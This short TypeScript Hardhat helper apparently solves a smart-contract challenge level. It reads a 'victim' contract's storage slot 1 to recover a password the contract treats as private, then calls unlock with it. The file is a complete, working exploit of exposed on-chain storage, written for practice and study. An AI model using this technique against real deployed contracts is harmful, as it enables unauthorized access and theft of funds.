import { expect } from "chai";
import { providers } from "ethers";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const hexPassword = await victim.provider.getStorageAt(victim.address, 1);
  await victim.unlock(hexPassword);
};

export default helper;
